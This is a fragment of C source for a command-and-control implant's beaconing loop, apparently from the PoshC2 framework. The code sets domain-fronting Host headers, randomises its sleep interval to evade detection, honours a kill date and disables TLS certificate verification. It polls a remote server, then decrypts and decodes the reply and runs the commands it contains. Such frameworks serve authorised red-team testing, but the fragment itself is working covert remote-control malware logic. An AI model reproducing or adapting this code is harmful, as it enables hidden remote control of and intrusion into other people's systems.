		CURL_EASY_SETOPT(curl, CURLOPT_NOSIGNAL, 0L);
		
		// Skip SSL verification
		CURL_EASY_SETOPT(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		CURL_EASY_SETOPT(curl, CURLOPT_SSL_VERIFYHOST, 0L);

		// this is where our response will go, need to make sure it's allocated before passed to curl
		response.response = malloc(1);
		response.size = 0;

		CURL_EASY_SETOPT(curl, CURLOPT_WRITEFUNCTION, curl_cb);
		CURL_EASY_SETOPT(curl, CURLOPT_WRITEDATA, (void *)&response);
#ifdef DEBUG
		CURL_EASY_SETOPT(curl, CURLOPT_VERBOSE, 1L);
#endif
		dprintf("%s", "------- Tick -------\n");

		// Check kill date
		time(&curr_time);
		if (curr_time > KILL_DATE) {
			printf("Bye!");
			exit(1);
		}
		// want random int between timer * (1-JITTER) and timer * (1+JITTER) so we're not predictable
		int max_sleep = SLEEP_TIME * ( 1 + JITTER);
		int min_sleep = SLEEP_TIME * (1 - JITTER);

		int rand_sleep = (rand() % (max_sleep + min_sleep)) + min_sleep;

		// generate url
		int server_idx;
		char *url = get_url(&server_idx); // FREE

		list = NULL;
		// This was present in the calls made by python. Not sure its necessary
		list = CURL_SLIST_APPEND(list, "Accept-Encoding: identity");

		// if we have some domain fronting hosts set header
		// This assumes Posh has correctly setup our array for us
		if (NUM_DOMAIN_HEADERS > 0) {
			host_hdr = malloc(strlen(DOMAIN_FRONT_HEADERS[server_idx]) +strlen("Host :")+1); // FREE
			strcpy(host_hdr, "Host: ");
			strcat(host_hdr, DOMAIN_FRONT_HEADERS[server_idx]);
			list = CURL_SLIST_APPEND(list, host_hdr);
			dprintf("Set host header to  = %s\n", DOMAIN_FRONT_HEADERS[server_idx]);
		}

		CURL_EASY_SETOPT(curl, CURLOPT_HTTPHEADER, list);
		CURL_EASY_SETOPT(curl, CURLOPT_URL, url);
		dprintf("Doing req to %s\n", url);

		res = CURL_EASY_PERFORM(curl);

		CURL_EASY_CLEANUP(curl);
		CURL_SLIST_FREE_ALL(list);

		if (res == CURLE_OK) {
			if (response.size != 0 && response.response[0] != '<'){
				dprintf("%s", "We have a base64 encoded response\n");
				dprintf("Response: %s\n", response.response);

				size_t encrypted_response_len;
				// base64 decode, this is not null terminated
				unsigned char *encrypted_response = base64_decode(response.response, response.size, &encrypted_response_len); // FREE
				if (encrypted_response) {
					size_t cmd_b64_len;
					unsigned char *cmd_b64 = _decrypt(key, encrypted_response, encrypted_response_len, &cmd_b64_len); // FREE

					free(encrypted_response);
					if (cmd_b64 != NULL) {
						// we now have a base64 encoded command, len cmd_b64_len
						dprintf("B64 cmd: %s, length: %d\n", cmd_b64, cmd_b64_len);

						size_t cmd_len;
						unsigned char *cmd = base64_decode(cmd_b64, cmd_b64_len, &cmd_len); // FREE

						if (cmd != NULL) {
							dprintf("cmd: %.*s, length: %d\n", cmd_len, cmd, cmd_len);

							extract_cmds((char *)cmd, cmd_len);

							dprintf("%s", "Finished processing commands\n");
							fflush(stdout);
							free(cmd);
						} else {
#ifdef DEBUG
							dprintf("unable to decode base64: %s", cmd_b64);
							hexdump("Raw was: ", cmd_b64, cmd_b64_len);
#endif
						}
						free(cmd_b64);
					} else {
						dprintf("%s", "Unable to decrypt!\n");
					}
				} else {
					dprintf("%s", "Unable to b64 decode response\n");
				}

				if (response.response != NULL) {
					free(response.response);
				}

			}
			if (NUM_DOMAIN_HEADERS > 0 && host_hdr != NULL) {
				free(host_hdr);
			}

			free(url);
			free(proxy);
		}
		dprintf("sleeping for: %d\n", rand_sleep);
		// Set debug builds to hammer the C2 
#ifdef DEBUG
		sleep(1);
#else
		sleep(rand_sleep);
#endif
		dprintf("%s", "\n\n\n\n");
		
	}
}
